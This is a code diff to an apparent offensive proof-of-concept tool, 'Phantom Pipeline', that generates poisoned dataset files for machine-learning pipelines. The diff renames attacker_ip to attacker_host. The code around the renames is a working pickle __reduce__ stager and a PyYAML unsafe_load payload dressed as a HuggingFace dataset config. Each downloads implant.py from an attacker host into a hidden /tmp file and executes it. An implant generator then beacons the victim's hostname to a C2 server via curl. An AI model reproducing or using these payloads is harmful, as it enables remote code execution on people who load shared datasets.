@@ -19,33 +19,33 @@ import os
 class _PickleStager:
     """Pickle payload that fetches and executes implant on deserialization."""
 
-    def __init__(self, attacker_ip: str, attacker_port: int = 8080):
-        self.attacker_ip = attacker_ip
+    def __init__(self, attacker_host: str, attacker_port: int = 8080):
+        self.attacker_host = attacker_host
         self.attacker_port = attacker_port
 
     def __reduce__(self):
         stager = (
             f"import urllib.request,os,sys;"
             f"urllib.request.urlretrieve("
-            f"'http://{self.attacker_ip}:{self.attacker_port}/implant.py',"
+            f"'http://{self.attacker_host}:{self.attacker_port}/implant.py',"
             f"'/tmp/.cache_ds.py');"
             f"exec(open('/tmp/.cache_ds.py').read())"
         )
         return (subprocess.Popen, (["python3", "-c", stager],))
 
 
-def generate_pickle(output_path: str, attacker_ip: str, attacker_port: int = 8080) -> str:
+def generate_pickle(output_path: str, attacker_host: str, attacker_port: int = 8080) -> str:
     """Generate malicious pickle file."""
-    payload = _PickleStager(attacker_ip, attacker_port)
+    payload = _PickleStager(attacker_host, attacker_port)
     with open(output_path, "wb") as f:
         pickle.dump(payload, f)
     print(f"[+] Malicious pickle generated: {output_path}")
     print(f"    Trigger: pickle.load(open('{output_path}', 'rb'))")
-    print(f"    Fetches implant from: http://{attacker_ip}:{attacker_port}/implant.py")
+    print(f"    Fetches implant from: http://{attacker_host}:{attacker_port}/implant.py")
     return output_path
 
 
-def generate_yaml(output_path: str, attacker_ip: str, attacker_port: int = 8080) -> str:
+def generate_yaml(output_path: str, attacker_host: str, attacker_port: int = 8080) -> str:
     """Generate malicious YAML config (PyYAML unsafe_load exploitation)."""
     payload = f"""# HuggingFace Dataset Configuration
 # Dataset: imagenet-1k-labels
@@ -65,7 +65,7 @@ pipeline: !!python/object/apply:subprocess.check_output
       - >-
         import urllib.request,os;
         urllib.request.urlretrieve(
-        'http://{attacker_ip}:{attacker_port}/implant.py',
+        'http://{attacker_host}:{attacker_port}/implant.py',
         '/tmp/.cache_ds.py');
         exec(open('/tmp/.cache_ds.py').read())
 """
@@ -73,11 +73,11 @@ pipeline: !!python/object/apply:subprocess.check_output
         f.write(payload)
     print(f"[+] Malicious YAML generated: {output_path}")
     print(f"    Trigger: yaml.unsafe_load(open('{output_path}'))")
-    print(f"    Fetches implant from: http://{attacker_ip}:{attacker_port}/implant.py")
+    print(f"    Fetches implant from: http://{attacker_host}:{attacker_port}/implant.py")
     return output_path
 
 
-def generate_implant(attacker_ip: str, gist_id: str, webhook_url: str) -> str:
+def generate_implant(attacker_host: str, gist_id: str, webhook_url: str) -> str:
     """
     Generate the implant script served by attacker HTTP server.
     This is what gets downloaded and exec()'d on the victim.
@@ -91,7 +91,7 @@ WEBHOOK = "{webhook_url}"
 # Signal beacon back to C2
 try:
     subprocess.Popen(
-        ["curl", "-s", "-X", "POST", "http://{attacker_ip}:8080/beacon",
+        ["curl", "-s", "-X", "POST", "http://{attacker_host}:8080/beacon",
          "-d", f"host={{os.uname().nodename}}"],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
@@ -125,11 +125,12 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Phantom Pipeline — Dataset Poisoning PoC")
     parser.add_argument("--vector", choices=["pickle", "yaml"], default="pickle")
     parser.add_argument("--output", default="/tmp/imagenet_labels.pkl")
-    parser.add_argument("--attacker-ip", default="10.4.60.21")
+    parser.add_argument("--attacker-host", default="10.4.60.21",
+                        help="Attacker IP or domain (e.g. 10.4.60.21 or c2.example.com)")
     parser.add_argument("--attacker-port", type=int, default=8080)
     args = parser.parse_args()
 
     if args.vector == "pickle":
-        generate_pickle(args.output, args.attacker_ip, args.attacker_port)
+        generate_pickle(args.output, args.attacker_host, args.attacker_port)
     else:
-        generate_yaml(args.output, args.attacker_ip, args.attacker_port)
+        generate_yaml(args.output, args.attacker_host, args.attacker_port)
